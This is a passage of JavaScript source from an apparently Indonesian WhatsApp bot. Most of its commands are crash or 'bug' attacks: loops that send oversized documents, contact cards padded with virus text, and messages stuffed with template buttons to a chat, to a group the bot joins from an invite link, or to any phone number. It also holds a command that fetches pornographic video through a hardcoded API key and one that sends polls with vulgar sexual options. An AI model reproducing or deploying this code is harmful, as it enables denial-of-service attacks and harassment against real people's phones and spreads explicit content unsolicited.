jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `Joness メ                         ${thejo}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fdocjo, contextInfo:{}})
}
repjo(`Sukses`)
}
break

case 'joness':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `Joness メ                         ${thejo}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fkonjo, contextInfo:{}})
jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `Joness メ                         ${thejo}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fdocjo, contextInfo:{}})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break

case 'ngeness':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `Ngeness メ                         ${thejo}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}}, {quoted: fkonjo, contextInfo:{}})
jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `Ngeness メ                         ${thejo}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}}, {quoted: fdocjo, contextInfo:{}})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break

case 'dokcok':{
if (!isCreator && !isBan) return
jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm} \n${thejo}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}},{quoted: fdocjo, contextInfo:{}})
jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm} \n${thejo}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}},{quoted: fkonjo, contextInfo:{}})
buttonjo(`Sukses`)
await setTimeout(() => {
jobotz.sendMessage(m.chat, {text: command},{ messageId: m.key.id,})
}, 2000)
}
break

case 'bokep': {
if (!isCreator && !isBan) return
sugiono = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
jobotz.sendMessage(m.chat, { video: sugiono, mimetype: 'video/mp4', fileName: `${command}.mp4`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm} \n${thejo}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo},{quoted: fdocjo, contextInfo:{}})
buttonjo(`Tuh Bokep`)
}
break
 case 'crashcok':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
kontolu = wm,
jobotz.sendMessage(m.chat, {text: kontolu, contextInfo: { externalAdReply:{title: `${thejo}`,body: wm, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://xnxx.com`}},caption: `anuk`},{quoted: fkonjo, contextInfo:{}})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'jadikuntul':{
if (!isCreator && !isBan) return 
if (!m.quoted && !text) throw `Teks/Reply`
jobotz.sendContact(m.chat, global.owner, fkonjo)
jobotz.sendContact(m.chat, global.owner, fdocjo)
buttonjo(`Sukses Convert Kuntul`)
}
break
case 'kuntulgc': {
if (!isCreator && !isBan) return
if (!q) return repjo(`Linkgc mana?\nContoh: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) repjo(`Masukkan linkgc yg valid`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '5'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await jobotz.groupAcceptInvite(result)
jobotz.sendContact(tosendgc, global.owner, fkonjo)
}
repjo(`Sukses`)
}
break

case 'kuntul': {
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendContact(m.chat, global.owner, fkonjo)
}
buttonjo(`Sukses Send Kuntul Sebanyak ${jumlah}`)
}
break
case 'kuntulto': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkonjo)
buttonjo(`Sukses Send Kuntul Di Nomer ${text}`)
}
break
case 'jogaskuntul': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkonjo)
jobotz.sendContact(m.chat, global.owner, fkonjo)
jobotz.sendContact(m.chat, global.owner, fkonjo)
jobotz.sendContact(m.chat, global.owner, fkonjo)
jobotz.sendContact(m.chat, global.owner, fkonjo)
jobotz.sendContact(m.chat, global.owner, fkonjo)
buttonjo(`Sukses Send Kuntul Di Nomer ${text}`)
}
break
case 'jadikontol':{
if (!isCreator && !isBan) return 
if (!m.quoted && !text) throw `Teks/Reply`
jobotz.sendContact(m.chat, global.premium, fkonjo)
buttonjo(`Sukses Convert Kontol`)
}
break
 case 'jadivirkon':{
if (!isCreator && !isBan) return
if (!m.quoted && !text) throw `Teks/Reply`
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/gambar/jo.jpg') }, { upload: jobotz.waUploadToServer })
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${text} ${viruskon}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;`${viruskon}`\nORG:\nTITLE:`${virusv3}`\nitem1.TEL:+6285714170944\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME\\,INTERNET\\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nEND:VCARD",
"jpegThumbnail": virgam,
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}}), { userJid: m.chat, quoted: fkonjo })
jobotz.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
buttonjo(`Sukses Convert Virkon`)
}
break

case 'virkongc': {
if (!isCreator && !isBan) return
if (!q) return repjo(`Linkgc mana?\nContoh: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) repjo(`Masukkan linkgc yg valid`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '5'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await jobotz.groupAcceptInvite(result)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/gambar/jo.jpg') }, { upload: jobotz.waUploadToServer })
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${viruskon}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;`${viruskon}`\nORG:\nTITLE:`${virusv3}`\nitem1.TEL:+6285714170944\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME\\,INTERNET\\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nEND:VCARD",
"jpegThumbnail": virgam,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}}), { userJid: m.chat, quoted: fkonjo })
jobotz.relayMessage(tosendgc, contact.message, { messageId: contact.key.id })
}
repjo(`Sukses`)
}
break

 case 'virkon':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/gambar/jo.jpg') }, { upload: jobotz.waUploadToServer })
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${viruskon}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;`${viruskon}`\nORG:\nTITLE:`${virusv3}`\nitem1.TEL:+6285714170944\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME\\,INTERNET\\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nEND:VCARD",
"jpegThumbnail": virgam,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}}), { userJid: m.chat, quoted: fkonjo })
jobotz.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
buttonjo(`Sukses Send Virkon Sebanyak ${jumlah}`)
}
break

case 'unlivirkon':{
if (!isCreator && !isBan) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/gambar/jo.jpg') }, { upload: jobotz.waUploadToServer })
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${viruskon}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;`${viruskon}`\nORG:\nTITLE:`${virusv3}`\nitem1.TEL:+6285714170944\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME\\,INTERNET\\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nEND:VCARD",
"jpegThumbnail": virgam,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}}), { userJid: m.chat, quoted: fkonjo })
jobotz.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
buttonjo(repjo)
await setTimeout(() => {
jobotz.sendMessage(m.chat, {text: command},{ messageId: m.key.id,})
}, 2000)
}
break

case 'unlikontol': {
if (!isCreator && !isBan) return
jobotz.sendContact(m.chat, global.premium, fkonjo)
buttonjo(repjo)
await setTimeout(() => {
jobotz.sendMessage(m.chat, {text: command},{ messageId: m.key.id,})
}, 2000)
}
break

case 'kontolgc': {
if (!isCreator && !isBan) return
if (!q) return repjo(`Linkgc mana?\nContoh: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) repjo(`Masukkan linkgc yg valid`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '5'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await jobotz.groupAcceptInvite(result)
jobotz.sendContact(tosendgc, global.premium, fkonjo)
}
repjo(`Sukses`)
}
break

case 'kontol': {
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendContact(m.chat, global.premium, fkonjo)
}
buttonjo(`Sukses Send Kontol Sebanyak ${jumlah}`)
}
break
case 'kontolto': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
buttonjo(`Sukses Send Kontol Di Nomer ${text}`)
}
break
case 'jogaskontol': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(m.chat, global.premium, fkonjo)
jobotz.sendContact(m.chat, global.premium, fkonjo)
jobotz.sendContact(m.chat, global.premium, fkonjo)
jobotz.sendContact(m.chat, global.premium, fkonjo)
jobotz.sendContact(m.chat, global.premium, fkonjo)
buttonjo(`Sukses Send Kontol Di Nomer ${text}`)
}
break
case 'jadikintil':{
if (!isCreator && !isBan) return 
if (!m.quoted && !text) throw `Teks/Reply`
jobotz.sendContact(m.chat, global.premium, fkonjo)
buttonjo(`Sukses Convert Kintil`)
}
break
case 'kintil': {
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendContact(m.chat, global.premium, fkonjo)
}
buttonjo(`Sukses Send Kintil Sebanyak ${jumlah}`)
}
break
case 'kintilto': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
buttonjo(`Sukses Send Kintil Di Nomer ${text}`)
}
break
case 'jogaskintil': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkonjo)
jobotz.sendContact(m.chat, global.premium, fkonjo)
jobotz.sendContact(m.chat, global.premium, fkonjo)
jobotz.sendContact(m.chat, global.premium, fkonjo)
jobotz.sendContact(m.chat, global.premium, fkonjo)
jobotz.sendContact(m.chat, global.premium, fkonjo)
buttonjo(`Sukses Send Kintil Di Nomer ${text}`)
}
break

case 'polling':{
if (!isCreator && !isBan) return 
if (!text) throw `Teksnya Mana?`
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": `HALO SAYA ${text}`,
"options": [
	{
"optionName": `${text} COLI`
	},
	{
"optionName": `${text} COLMEK`
	},
	{
"optionName": `${text} NGOCOK`
	},
	{
"optionName": `${text} NGENTOT`
	},
	{
"optionName": `SALAM GUA BY: ${text}`
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: fdocjo })
jobotz.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
buttonjo(`Silahkan Di Vote`)
}
break
case 'polvot': {
if (!isCreator && !isBan) return
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": `HALO SAYA ${wm}`,
"options": [
	{
"optionName": "VOTE YUK"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SALAM CREATOR BOT"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: fkonjo })
jobotz.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
buttonjo(`Vote Aja Semua`)
}
break
case 'poll': {
if (!isCreator && !isBan) return
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": `HALO SAYA YAN BOTZ-MD`,
"options": [
	{
"optionName": "VOTE YUK"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SALAM CREATOR BOT"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: fdocjo })
jobotz.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
buttonjo(`Vote Aja Semua`)
}
break
case 'jobugdocto':{
if (!isCreator && !isBan) return
if (!text) return repjo(`Nomernya mana?`)
jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title:`${wm}`,body: `${wm} \n${thejo}`, previewType:"PHOTO", showAdAttribution: true, thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fkonjo, contextInfo:{}})
repjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break

case 'jobugdoc':{
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                      ${virusv3}`,contextInfo: { externalAdReply:{title:`${wm}`,body: `${wm} ${thejo}`, previewType:"PHOTO",thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fdocjo, contextInfo:{}})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'jadibugdoc':{
if (!isCreator && !isBan) return 
if (!m.quoted) throw `*Send/Reply Media`
if (!text) throw `Teksnya Mana?`
let media = await quoted.download()
var messa = await prepareWAMessageMedia(
{ document: media }, 
{ upload: jobotz.waUploadToServer })
kkk = media
jobotz.sendMessage(m.chat, {document: kkk, mimetype: 'document/pdf', fileName: `${text}            ${virusv3}`,contextInfo: { externalAdReply:{title:`${wm}`,body: `${wm}    ${thejo}`, previewType:"PHOTO",thumbnail: virgam,sourceUrl:`https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`}}, caption: captijo}, {quoted: fkonjo, contextInfo:{}})
buttonjo(`Sukses Convert Bugdoc`)
}
break
case 'jodocu':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
y1 = fs.readFileSync('./src/vn/lu siapa anjir.mp3')
jobotz.sendMessage(m.chat, {document: y1, mimetype: 'document/pdf', fileName: ` ${wm} ${thejo} ${virusv3}.js`}, {quoted: fdocjo})
jobotz.sendMessage(m.chat, {document: y1, mimetype: 'document/pdf', fileName: ` ${wm} ${thejo} ${virusv3}.js`}, {quoted: fkonjo})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'jadibugbutton':{
if (!isCreator && !isBan) return 
if (!text) throw `Teksnya Mana?`
              const buttons = [
  {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: `${jobot}`}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: `${thejo}`}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: `${jobot}`}, type: 1}
]

const buttonMessage = {
    text: `BUG BY ${text}\n${thejo}`,
    footerText: `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
    buttons: buttons,
    headerType: 1
}
jobotz.sendMessage(m.chat, buttonMessage)
buttonjo(`Sukses Convert Bugbutton`)
}
   break

case 'teluhaja':{
if (!isCreator && !isBan) return
jobotz.sendMessage(m.chat, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
buttonjo(`Start`)
await sleep(10000)
await setTimeout(() => {
jobotz.sendMessage(m.chat, {text: command},{ messageId: m.key.id,})
}, 1000)
}
 break

case 'jaditeluh':{
if (!isCreator && !isBan) return
if (!text) throw `Teksnya Mana?`
jumlah = '9'
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, {
text: `${text}`, 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
buttonjo(`Sukses`)
}
 break

case 'button9':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
buttonjo(`Sukses`)
}
 break

case 'button8':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
buttonjo(`Sukses`)
}
 break

case 'button7':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
buttonjo(`Sukses`)
}
 break

case 'button6':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
buttonjo(`Sukses`)
}
 break

case 'bugbutton':{
              if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
              const buttons = [
  {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: `${jobot}`}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: `${thejo}`}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: `${jobot}`}, type: 1}
]

const buttonMessage = {
    text: `${thejo}`,
    footerText: `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
    buttons: buttons,
    headerType: 1
}
jobotz.sendMessage(m.chat, buttonMessage)
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
               break
case 'buttonbro':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
a = await jobotz.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
              const buttons = [
  {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: `${jobot}`}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: `${thejo}`}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: `${jobot}`}, type: 1}
]

const buttonMessage = {
    text: `${four}`,
    footerText: `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
    buttons: buttons,
    headerType: 1
}
jobotz.sendMessage(m.chat, buttonMessage,  { quoted: a })
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
   break
case 'jadibuttonimg':{
if (!isCreator && !isBan) return 
if (!m.quoted) throw `*Send/Reply Image`
if (!text) throw `Teksnya Mana?`
let media = await quoted.download()
var messa = await prepareWAMessageMedia(
{ image: media }, 
{ upload: jobotz.waUploadToServer })
let buttons = [
{buttonId: `bugjo`, buttonText: { displayText: `${jobot}` }, type: 1 },
{buttonId: `allmenu`, buttonText: { displayText: `${thejo}` }, type: 1 },
{buttonId: `listmenu`, buttonText: { displayText: `${jobot}` }, type: 1 },
]
let buttonMessage = {
image: media,
caption: `BUG BY ${text} \nYouTube: https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
footer: thejo,
buttons: buttons,
headerType: 4
}
jobotz.sendMessage(m.chat, buttonMessage, { quoted: shield2 })
buttonjo(`Sukses Convert Buttonimg`)
}
break
case 'buttonpdf': {
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
let buttons = [
{buttonId: `bugjo`, buttonText: { displayText: `${jobot}` }, type: 1 },
